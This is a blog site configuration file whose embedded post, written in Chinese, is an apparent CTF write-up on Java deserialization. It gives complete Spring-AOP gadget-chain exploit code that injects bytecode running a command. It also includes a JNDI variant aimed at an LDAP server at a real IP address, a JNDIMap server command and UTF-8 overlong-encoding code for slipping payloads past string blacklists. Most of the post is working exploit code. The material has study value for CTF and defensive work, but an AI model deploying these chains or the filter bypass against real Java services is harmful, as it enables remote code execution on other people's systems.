{"singlePage": [], "startSite": "", "filingNum": "", "onePageListNum": 15, "commentLabelColor": "#006b75", "yearColorList": ["#bc4c00", "#0969da", "#1f883d", "#A333D0"], "i18n": "CN", "themeMode": "manual", "dayTheme": "light", "nightTheme": "dark", "urlMode": "pinyin", "script": "", "style": "", "head": "", "indexScript": "", "indexStyle": "", "bottomText": "", "showPostSource": 1, "iconList": {}, "UTC": 8, "rssSplit": "sentence", "exlink": {}, "needComment": 1, "allHead": "", "title": "CHHHCHHOH's BLOG", "subTitle": "\u91cd\u6784\u4e86\u4e00\u4e0b", "avatarUrl": "https://github.githubassets.com/favicons/favicon.svg", "GMEEK_VERSION": "last", "postListJson": {"P1": {"htmlDir": "docs/post/justDeserialize.html", "labels": ["documentation"], "postTitle": "justDeserialize", "postUrl": "post/justDeserialize.html", "postSourceUrl": "https://github.com/CHHHCHHOH/chhhchhoh.github.io/issues/1", "commentNum": 0, "wordCount": 36369, "description": "\u8fd9\u91cc\u7528\u7684\u662fSpring-Aop\u7684\u94fe\u5b50\n\n```java\npackage org.example.spring;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.springframework.aop.aspectj.AspectJAroundAdvice;\nimport org.springframework.aop.aspectj.AspectJExpressionPointcut;\nimport org.springframework.aop.aspectj.SingletonAspectInstanceFactory;\nimport org.springframework.aop.framework.Advised;\nimport org.springframework.aop.framework.AdvisedSupport;\nimport org.springframework.aop.support.DefaultIntroductionAdvisor;\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\n\npublic class SpringAop {\n    public static void main(String[] args) throws Throwable {\n\n        /// sink TemplatesImpl#getOutputProperties java\u539f\u751f\n        byte[] code = getTemplates();\n        byte[][] codes = {code};\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates, '_name', 'useless');\n        setFieldValue(templates, '_tfactory',  new TransformerFactoryImpl(\n        ));\n        setFieldValue(templates, '_bytecodes', codes);\n\n        /// AspectJAroundAdvice#invoke -> AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs -> xxx#yyy() spring-aop\n        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(TemplatesImpl.class.getDeclaredMethod('getOutputProperties'), new AspectJExpressionPointcut(),new SingletonAspectInstanceFactory(templates)); // \u8c03\u7528\u4efb\u610f\u5bf9\u8c61\u7684\u65e0\u53c2\u65b9\u6cd5 templates#getOutputProperties()\n//        Constructor<ReflectiveMethodInvocation> reflectiveMethodInvocationConstructor = ReflectiveMethodInvocation.class.getDeclaredConstructor(Object.class, Object.class, Method.class, Object[].class, Class.class, List.class);\n//        reflectiveMethodInvocationConstructor.setAccessible(true);\n//        ArrayList<Object> list = new ArrayList<>();\n//        list.add(aspectJAroundAdvice);\n//        ReflectiveMethodInvocation  mi = reflectiveMethodInvocationConstructor.newInstance(null, null, String.class.getMethod('toString'), null, null, list);\n//        aspectJAroundAdvice.invoke(mi);\n//        invocation.proceed();\n\n        /// Proxy#xxx(\u9664\u4e86equals,hashcode) -> JdkDynamicAopProxy#invoke -> ReflectiveMethodInvocation#proceed -> AspectJAroundAdvice#invoke spring-aop\n        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(aspectJAroundAdvice);\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        advisedSupport.addAdvisor(advisor);\n        Constructor JdkDynamicAopProxyconstructor = Class.forName('org.springframework.aop.framework.JdkDynamicAopProxy').getConstructor(AdvisedSupport.class);\n        JdkDynamicAopProxyconstructor.setAccessible(true);\n        InvocationHandler handler = (InvocationHandler) JdkDynamicAopProxyconstructor.newInstance(advisedSupport);\n        Advised o = (Advised) Proxy.newProxyInstance(Advised.class.getClassLoader(), new Class[]{Advised.class}, handler);\n\n        /// BadAttributeValueExpException#readObject -> toString java\u539f\u751f\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n        setFieldValue(badAttributeValueExpException, 'val', o);\n\n        unserialize(serialize(badAttributeValueExpException));\n    }\n    public static void setFieldValue(Object obj, String field, Object val) throws Exception{\n        Field dField = obj.getClass().getDeclaredField(field);\n        dField.setAccessible(true);\n        dField.set(obj, val);\n    }\n    public static byte[] serialize(Object obj) throws Exception {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(obj);\n        return baos.toByteArray();\n    }\n    public static Object unserialize(byte[] bytes) throws Exception{\n        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois = new ObjectInputStream(bais);\n        return ois.readObject();\n\n    }\n    public static byte[] getTemplates() throws Exception{\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass('MyTemplate');\n        template.setSuperclass(pool.get('com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet'));\n        String block = 'Runtime.getRuntime().exec(\\'calc\\');';\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n}\n```\n\n\u8fd9\u91ccBadAttributeValueExpException\u88abban\u4e86\uff0c\u6211\u4eec\u7528PriorityQueue\u6765\u89e6\u53d1compare\n\n![Image](https://github.com/user-attachments/assets/29a0a055-a763-4ee1-bccf-b8b0b9193ba5)\n\n\u7136\u540e\u6211\u4eec\u8981\u627e\u4e00\u4e2a\u65e0\u53c2\u7684sink\n\n### \u65b9\u6cd5\u4e00\n\n\u8fd9\u91cc\u7528\u7684\u662fLdapAttribute#getAttributeDefinition\u6765\u8fdb\u884cjndi \u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\n\n```java\nimport org.springframework.aop.aspectj.AspectJAroundAdvice;\nimport org.springframework.aop.aspectj.AspectJExpressionPointcut;\nimport org.springframework.aop.aspectj.SingletonAspectInstanceFactory;\nimport org.springframework.aop.framework.AdvisedSupport;\nimport org.springframework.aop.support.DefaultIntroductionAdvisor;\nimport javax.naming.CompositeName;\nimport javax.naming.directory.BasicAttribute;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.Base64;\nimport java.util.Comparator;\nimport java.util.PriorityQueue;\n\npublic class SpringAop {\n    public static void main(String[] args) throws Throwable {\n\n        /// sink LdapAttribute#getAttributeDefinition java\u539f\u751f\n        Class clazz = Class.forName('com.sun.jndi.ldap.LdapAttribute');\n        Constructor constructor = clazz.getDeclaredConstructor(String.class);\n        constructor.setAccessible(true);\n        BasicAttribute ldapAttribute = (BasicAttribute) constructor.newInstance('name');\n        setFieldValue(ldapAttribute, 'baseCtxURL', 'ldap://124.221.19.214:2333');\n        setFieldValue(ldapAttribute, 'rdn', new CompositeName('a/b'));\n        \n        /// AspectJAroundAdvice#invoke -> AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs -> xxx#yyy() spring-aop\n        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(clazz.getDeclaredMethod('getAttributeDefinition'), new AspectJExpressionPointcut(),new SingletonAspectInstanceFactory(ldapAttribute)); // \u8c03\u7528\u4efb\u610f\u5bf9\u8c61\u7684\u65e0\u53c2\u65b9\u6cd5 LdapAttribute#getAttributeDefinition()\n\n        /// Proxy#xxx(\u9664\u4e86equals,hashcode) -> JdkDynamicAopProxy#invoke -> ReflectiveMethodInvocation#proceed -> AspectJAroundAdvice#invoke spring-aop\n        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(aspectJAroundAdvice);\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        advisedSupport.addAdvisor(advisor);\n        Constructor JdkDynamicAopProxyconstructor = Class.forName('org.springframework.aop.framework.JdkDynamicAopProxy').getConstructor(AdvisedSupport.class);\n        JdkDynamicAopProxyconstructor.setAccessible(true);\n        InvocationHandler handler = (InvocationHandler) JdkDynamicAopProxyconstructor.newInstance(advisedSupport);\n        Comparator o = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);\n\n        /// PriorityQueue#readObject -> compare java\u539f\u751f\n        PriorityQueue priorityQueue = new PriorityQueue();\n        setFieldValue(priorityQueue,'comparator',o);\n        setFieldValue(priorityQueue,'queue',new Object[]{1,2}); // compareObject.compare(1,2)\n        setFieldValue(priorityQueue,'size',2);\n        byte[] ser = serialize(priorityQueue);\n        System.out.println(Base64.getEncoder().encodeToString(ser));\n        unserialize(ser);\n    }\n    public static void setFieldValue(Object obj, String field, Object val) throws Exception{\n        Field dField = obj.getClass().getDeclaredField(field);\n        dField.setAccessible(true);\n        dField.set(obj, val);\n    }\n    public static byte[] serialize(Object obj) throws Exception {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(obj);\n        return baos.toByteArray();\n    }\n    public static Object unserialize(byte[] bytes) throws Exception{\n        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois = new ObjectInputStream(bais);\n        return ois.readObject();\n    }\n}\n```\n\n\u8fd9\u91cc\u6211\u7528JNDIMap\u8d77\u4e86\u670d\u52a1\u7aef\uff0ctest.ser\u662f\u7528\u7684\u4e4b\u524dTemplates\u4f5c\u4e3asink\u751f\u6210\u7684\u6ca1\u6709base64\u7f16\u7801\u7684\u5e8f\u5217\u5316\u6570\u636e\n\n```bash\njava -jar JNDIMap-0.0.1.jar -i 124.221.19.214 -l 2333 -p 3232 -u /Deserialize/FromFile/test.ser\n```\n\n![Image](https://github.com/user-attachments/assets/66e96edd-f9e3-4a43-b140-ac9f660ebe26)\n\n\u6210\u529f\u5f39\u8ba1\u7b97\u5668\n\n![Image](https://github.com/user-attachments/assets/74e379b9-b604-45b3-adf9-7ce5b687a9a2)\n\n\u4f46\u662f\u53d1\u5305\u88abban\u4e86\uff0c\u56e0\u4e3a\u8fd9\u91cc\u7528\u4e86javax.naming.CompositeName\uff0c\u6240\u4ee5\u8981\u7ed5\u8fc7\u5b57\u7b26\u4e32\u68c0\u6d4b\n\n![Image](https://github.com/user-attachments/assets/9ced416d-a982-4edc-afc3-e8fb429e6299)\n\n[[\u8fd9\u91cc\u7528Whoopsunix\u5e08\u5085\u7684\u9879\u76ee\u7ed5\u8fc7](https://github.com/Whoopsunix/utf-8-overlong-encoding)](https://github.com/Whoopsunix/utf-8-overlong-encoding)\n\n```java\n/**\n * @author Whoopsunix\n * <p>\n * UTF-8 \u6df7\u6dc6\n */\npublic class UTF8BytesMix {\n\n    public static byte[] resultBytes = new byte[0];\n    public static byte[] originalBytes = new byte[0];\n\n    // \u52a0\u5bc6\u5b57\u8282\u4f4d\u6570\n    public static int type = 2; //3\n\n    // \u539f byte[] \u5750\u6807\n    public static int index = 0;\n\n    final static byte TC_CLASSDESC = (byte) 0x72;\n    final static byte TC_PROXYCLASSDESC = (byte) 0x7d;\n    final static byte TC_STRING = (byte) 0x74;\n    final static byte TC_REFERENCE = (byte) 0x71;\n    final static byte TC_LONGSTRING = (byte) 0x7C;\n    final static byte TC_ARRAY = (byte) 0x75;\n    final static byte TC_ENDBLOCKDATA = (byte) 0x78;\n    final static byte TC_NULL = (byte) 0x70;\n\n\n    final static byte Byte = (byte) 0x42;\n    final static byte Char = (byte) 0x43;\n    final static byte Double = (byte) 0x44;\n    final static byte Float = (byte) 0x46;\n    final static byte Integer = (byte) 0x49;\n    final static byte Long = (byte) 0x4a;\n    final static byte Object_L = (byte) 0x4c;\n    final static byte Short = (byte) 0x53;\n    final static byte Boolean = (byte) 0x5a;\n    final static byte Array = (byte) 0x5b;\n\n\n    public UTF8BytesMix(byte[] originalBytes) {\n        this.originalBytes = originalBytes;\n    }\n\n    public static byte[] builder() {\n        while (index < originalBytes.length) {\n            byte b = originalBytes[index];\n            byteAdd(b);\n\n            if (b == TC_CLASSDESC) {\n                changeTC_CLASSDESC();\n            } else if (b == TC_PROXYCLASSDESC) {\n                changeTC_PROXYCLASSDESC();\n            } else if (b == TC_STRING) {\n                changeTC_STRING();\n            }\n\n            index++;\n        }\n        return resultBytes;\n    }\n\n    public static void changeTC_PROXYCLASSDESC() {\n        int interfaceCount = ((originalBytes[index + 1] & 0xFF) << 24) |\n                ((originalBytes[index + 2] & 0xFF) << 16) |\n                ((originalBytes[index + 3] & 0xFF) << 8) |\n                (originalBytes[index + 4] & 0xFF);\n        if (interfaceCount > 0xff || interfaceCount < 0x00)\n            return;\n\n        for (int i = 0; i < 4; i++) {\n            byteAdd(originalBytes[index + 1]);\n            index++;\n        }\n\n        int length = ((originalBytes[index + 1] & 0xFF) << 8) | (originalBytes[index + 2] & 0xFF);\n        byte[] originalValue = new byte[length];\n        System.arraycopy(originalBytes, index + 3, originalValue, 0, length);\n        index += 3 + length;\n\n        encode(originalValue, type);\n        index--;\n    }\n\n\n    public static boolean changeTC_CLASSDESC() {\n        /**\n         * \u7c7b\u4fe1\u606f\n         */\n        boolean isTC_CLASSDESC = changeTC_STRING();\n        if (!isTC_CLASSDESC) {\n            return false;\n        }\n        index++;\n\n        /**\n         * SerialVersionUID + ClassDescFlags\n         */\n        byte[] serialVersionUID = new byte[9];\n        System.arraycopy(originalBytes, index, serialVersionUID, 0, 9);\n        for (int i = 0; i < serialVersionUID.length; i++) {\n            byteAdd(serialVersionUID[i]);\n        }\n        index += 9;\n\n        /**\n         * FieldCount\n         */\n        byte[] fieldCount = new byte[2];\n        System.arraycopy(originalBytes, index, fieldCount, 0, 2);\n        for (int i = 0; i < fieldCount.length; i++) {\n            byteAdd(fieldCount[i]);\n        }\n        int fieldCounts = ((fieldCount[0] & 0xFF) << 8) | (fieldCount[1] & 0xFF);\n        index += 2;\n\n        for (int i = 0; i < fieldCounts; i++) {\n            boolean isFiledOver = false;\n\n            /**\n             * FieldName\n             */\n            if (originalBytes[index] == Byte\n                    || originalBytes[index] == Char\n                    || originalBytes[index] == Double\n                    || originalBytes[index] == Float\n                    || originalBytes[index] == Integer\n                    || originalBytes[index] == Long\n                    || originalBytes[index] == Object_L\n                    || originalBytes[index] == Short\n                    || originalBytes[index] == Boolean\n                    || originalBytes[index] == Array) {\n                // Object\n                byteAdd(originalBytes[index]);\n                index++;\n\n                int fieldLength = ((originalBytes[index] & 0xFF) << 8) | (originalBytes[index + 1] & 0xFF);\n                byte[] originalFieldName = new byte[fieldLength];\n                System.arraycopy(originalBytes, index + 2, originalFieldName, 0, fieldLength);\n                index += 2 + fieldLength;\n                encode(originalFieldName, type);\n            }\n\n            /**\n             * Class Name\n             *\n             * \u4e5f\u89c4\u907f\u4e86\u8fd9\u79cd\u60c5\u51b5\n             *          Index 0:\n             *           Integer - I - 0x49\n             *           @FieldName\n             *             @Length - 4 - 0x00 04\n             *             @Value - size - 0x73 69 7a 65\n             */\n            // TC_STRING 0x74\n            if (originalBytes[index] == TC_STRING) {\n\n                byteAdd(originalBytes[index]);\n                index++;\n\n                int classLength = ((originalBytes[index] & 0xFF) << 8) | (originalBytes[index + 1] & 0xFF);\n                byte[] originalClassName = new byte[classLength];\n                System.arraycopy(originalBytes, index + 2, originalClassName, 0, classLength);\n                index += 2 + classLength;\n                encode(originalClassName, type);\n                isFiledOver = true;\n            } else if (originalBytes[index] == TC_REFERENCE) {\n                /**\n                 * Index 0:\n                 * Object - L - 0x4c\n                 * @FieldName\n                 * @Length - 9 - 0x00 09\n                 * @Value - decorated - 0x64 65 63 6f 72 61 74 65 64\n                 * @ClassName\n                 *         TC_REFERENCE - 0x71\n                 * @Handler - 8257537 - 0x00 7e 00 01\n                 */\n                byte[] reference = new byte[5];\n                System.arraycopy(originalBytes, index, reference, 0, 5);\n                for (int j = 0; j < reference.length; j++) {\n                    byteAdd(reference[j]);\n                }\n                index += 5;\n                isFiledOver = true;\n            }\n\n            // todo \u770b\u770b\u5176\u4ed6\u53ef\u80fd\u672a\u8bc6\u522b\u5230\u7684\u7c7b\u578b\n//            if(i < fieldCounts - 1 && !isFiledOver) {\n//                while (true) {\n//                    if (!isField(originalBytes, index)) {\n//                        byteAdd(originalBytes[index]);\n//                        index++;\n//                    } else {\n//                        break;\n//                    }\n//                }\n//            }\n\n        }\n\n        // \u5faa\u73af\u9700\u8981\n        index--;\n        return true;\n    }\n\n    public static boolean changeTC_STRING() {\n        int length = ((originalBytes[index + 1] & 0xFF) << 8) | (originalBytes[index + 2] & 0xFF);\n        // \u6ea2\u51fa\n        if (length > 0xff || length < 0x00)\n            return false;\n\n        // \u539f\u59cb\u5185\u5bb9\n        byte[] originalValue = new byte[length];\n        System.arraycopy(originalBytes, index + 3, originalValue, 0, length);\n        // \u975e\u5168\u90e8\u53ef\u89c1\u5b57\u7b26\uff0c\u53ef\u80fd\u5b58\u5728\u7684\u62a5\u9519\uff0c\u4e0d\u7ee7\u7eed\u6267\u884c\n        if (!isByteVisible(originalValue)) {\n            return false;\n        }\n\n        index += 3 + length;\n        encode(originalValue, type);\n\n        index--;\n        return true;\n    }\n\n\n    public static boolean isField(byte[] checkBytes, int index) {\n        if (!(checkBytes[index] == Byte\n                || checkBytes[index] == Char\n                || checkBytes[index] == Double\n                || checkBytes[index] == Float\n                || checkBytes[index] == Integer\n                || checkBytes[index] == Long\n                || checkBytes[index] == Object_L\n                || checkBytes[index] == Short\n                || checkBytes[index] == Boolean\n                || checkBytes[index] == Array)) {\n            return false;\n        }\n\n        int length = ((checkBytes[index + 1] & 0xFF) << 8) | (checkBytes[index + 2] & 0xFF);\n        if (length > 0xff || length < 0x00)\n            return false;\n        byte[] lengthBytes = new byte[length];\n        try {\n            System.arraycopy(checkBytes, index + 3, lengthBytes, 0, length);\n        } catch (Exception e) {\n            return false;\n        }\n\n        return true;\n    }\n\n    /**\n     * \u52a0\u5bc6\n     *\n     * @return\n     */\n    public static void encode(byte[] originalValue, int type) {\n        if (type == 3) {\n            // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx\n            int newLength = originalValue.length * 3;\n\n            byteAdd((byte) ((newLength >> 8) & 0xFF));\n            byteAdd((byte) (newLength & 0xFF));\n\n            for (int i = 0; i < originalValue.length; i++) {\n                char c = (char) originalValue[i];\n                byteAdd((byte) (0xE0 | ((c >> 12) & 0x0F)));\n                byteAdd((byte) (0x80 | ((c >> 6) & 0x3F)));\n                byteAdd((byte) (0x80 | ((c >> 0) & 0x3F)));\n            }\n\n        } else {\n            // 2 byte format: 110xxxxx 10xxxxxx\n            int newLength = originalValue.length * 2;\n\n            byteAdd((byte) ((newLength >> 8) & 0xFF));\n            byteAdd((byte) (newLength & 0xFF));\n\n            for (int i = 0; i < originalValue.length; i++) {\n                char c = (char) originalValue[i];\n                byteAdd((byte) (0xC0 | ((c >> 6) & 0x1F)));\n                byteAdd((byte) (0x80 | ((c >> 0) & 0x3F)));\n            }\n        }\n\n\n    }\n\n    /**\n     * \u5224\u65ad\u5b57\u8282\u662f\u5426\u5728\u53ef\u89c1\u5b57\u7b26\u7684 ASCII \u8303\u56f4\u5185\n     *\n     * @param bytes\n     * @return\n     */\n    public static boolean isByteVisible(byte[] bytes) {\n        for (byte b : bytes) {\n            if (b < 32 || b > 126) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static void byteAdd(byte b) {\n        byte[] newBytes = new byte[resultBytes.length + 1];\n        System.arraycopy(resultBytes, 0, newBytes, 0, resultBytes.length);\n        newBytes[resultBytes.length] = b;\n        resultBytes = newBytes;\n    }\n}\n```\n\n\u5e8f\u5217\u5316\u7684\u90e8\u5206\u7528\u8fd9\u53e5\u4fee\u6539\u5c31\u53ef\u4ee5\u4e86\n\n```java\n/// UTF8Overlong\u7ed5\u8fc7\u5b57\u7b26\u4e32\u68c0\u6d4b\nSystem.out.println(Base64.getEncoder().encodeToString(new UTF8BytesMix(serialize(priorityQueue)).builder()));\n```\n\n\u6210\u529f\u5f39\u8ba1\u7b97\u5668\n\n![Image](https://github.com/user-attachments/assets/360010d5-0f2e-469a-b1e0-9a0f16b91244)\n\n### \u65b9\u6cd5\u4e8c\n\n\u5b9e\u9645\u4e0a\u6bd4\u8d5b\u65f6\u662f\u4e0d\u51fa\u7f51\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u80fd\u6253jndi\uff0c\u53ef\u4ee5\u7528hsqldb\u6253\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\uff0c\u6539\u4e2asink\u94fe\u5c31\u53ef\u4ee5\u4e86\u3002", "top": 0, "createdAt": 1744898426, "style": "", "script": "", "head": "", "ogImage": "https://github.githubassets.com/favicons/favicon.svg", "createdDate": "2025-04-17", "dateLabelColor": "#0969da"}}, "singeListJson": {}, "labelColorDict": {"bug": "#d73a4a", "documentation": "#0075ca", "duplicate": "#cfd3d7", "enhancement": "#a2eeef", "good first issue": "#7057ff", "help wanted": "#008672", "invalid": "#e4e669", "question": "#d876e3", "wontfix": "#ffffff"}, "displayTitle": "CHHHCHHOH's BLOG", "faviconUrl": "https://github.githubassets.com/favicons/favicon.svg", "ogImage": "https://github.githubassets.com/favicons/favicon.svg", "primerCSS": "<link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />", "homeUrl": "https://chhhchhoh.github.io", "prevUrl": "disabled", "nextUrl": "disabled"}